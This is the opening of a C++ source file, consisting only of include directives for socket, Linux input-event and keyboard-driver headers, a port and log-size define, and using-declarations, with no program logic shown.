#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <map>
#include <thread>
#include <arpa/inet.h>
#include <linux/input.h>
#include <fstream>
#include "keyboard-driver/keyboard.h"

#define PORT 1393
#define LOG_FILE_SIZE 4096

using std::map;
using std::cout;
using std::cin;
using std::string;
using std::thread;
using std::endl;
using std::streampos;